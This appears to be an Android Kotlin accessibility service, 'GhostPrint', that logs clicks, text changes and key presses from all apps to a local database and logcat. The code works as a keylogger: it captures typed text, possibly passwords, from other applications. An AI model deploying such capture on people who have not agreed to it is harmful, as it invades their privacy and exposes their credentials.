package com.ghostprint.ui.accessibility

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Log
import android.view.KeyEvent
import android.view.accessibility.AccessibilityEvent
import com.ghostprint.ui.data.AppDatabase
import com.ghostprint.ui.data.InputLog
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class GhostPrintAccessibilityService : AccessibilityService() {

    private val ioScope = CoroutineScope(Dispatchers.IO)
    private lateinit var db: AppDatabase

    override fun onServiceConnected() {
        super.onServiceConnected()
        db = AppDatabase.getInstance(this)

        serviceInfo = serviceInfo.apply {
            flags = flags or
                    AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        val ts = System.currentTimeMillis()
        val typeName = when (event.eventType) {
            AccessibilityEvent.TYPE_VIEW_CLICKED -> "view_click"
            AccessibilityEvent.TYPE_VIEW_SCROLLED -> "view_scroll"
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> "text_change"
            else -> "event_${event.eventType}"
        }
        val msg = "pkg=${event.packageName} cls=${event.className} text=${event.text?.joinToString() ?: ""}"

        ioScope.launch {
            db.inputLogDao().insert(InputLog(timestamp = ts, type = typeName, message = msg))
        }
        Log.d("GhostPrintService", "[$ts] $typeName $msg")
    }

    override fun onKeyEvent(event: KeyEvent?): Boolean {
        if (event == null) return false
        val ts = System.currentTimeMillis()
        val type = if (event.action == KeyEvent.ACTION_DOWN) "key_down" else "key_up"
        val msg = "code=${event.keyCode} unicode=${event.unicodeChar}"

        ioScope.launch {
            db.inputLogDao().insert(InputLog(timestamp = ts, type = type, message = msg))
        }
        Log.d("GhostPrintService", "[$ts] $type $msg")
        return false
    }

    override fun onInterrupt() {}
}